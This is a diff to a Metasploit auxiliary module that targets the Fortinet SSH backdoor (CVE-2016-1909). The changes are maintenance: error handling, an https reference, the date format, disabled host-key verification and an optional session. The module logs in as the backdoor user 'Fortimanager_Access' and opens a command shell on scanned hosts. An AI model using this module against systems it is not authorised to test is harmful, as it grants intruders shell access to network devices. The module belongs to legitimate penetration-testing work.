@@ -3,12 +3,9 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-# XXX: This shouldn't be necessary but is now
-require 'net/ssh/command_stream'
-
 class MetasploitModule < Msf::Auxiliary
+
   include Msf::Exploit::Remote::SSH
-  include Msf::Exploit::Remote::Fortinet
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::CommandShell
   include Msf::Auxiliary::Report
@@ -27,10 +24,10 @@ class MetasploitModule < Msf::Auxiliary
         ['CVE', '2016-1909'],
         ['EDB', '39224'],
         ['PACKETSTORM', '135225'],
-        ['URL', 'http://seclists.org/fulldisclosure/2016/Jan/26'],
+        ['URL', 'https://seclists.org/fulldisclosure/2016/Jan/26'],
         ['URL', 'https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios']
       ],
-      'DisclosureDate' => 'Jan 9 2016',
+      'DisclosureDate' => '2016-01-09',
       'License'        => MSF_LICENSE
     ))
 
@@ -55,6 +52,7 @@ class MetasploitModule < Msf::Auxiliary
       non_interactive: true,
       config:          false,
       use_agent:       false,
+      verify_host_key: :never,
       proxy:           factory
     }
 
@@ -84,15 +82,23 @@ class MetasploitModule < Msf::Auxiliary
 
     shell = Net::SSH::CommandStream.new(ssh)
 
-    return unless shell
+    # XXX: Wait for CommandStream to log a channel request failure
+    sleep 0.1
 
-    info = "Fortinet SSH Backdoor (#{version})"
+    if (e = shell.error)
+      print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
+      return
+    end
+
+    info = "#{self.name} (#{version})"
 
     ds_merge = {
       'USERNAME' => 'Fortimanager_Access'
     }
 
-    start_session(self, info, ds_merge, false, shell.lsock)
+    if datastore['CreateSession']
+      start_session(self, info, ds_merge, false, shell.lsock)
+    end
 
     # XXX: Ruby segfaults if we don't remove the SSH socket
     remove_socket(ssh.transport.socket)
@@ -101,4 +107,5 @@ class MetasploitModule < Msf::Auxiliary
   def rport
     datastore['RPORT']
   end
+
 end
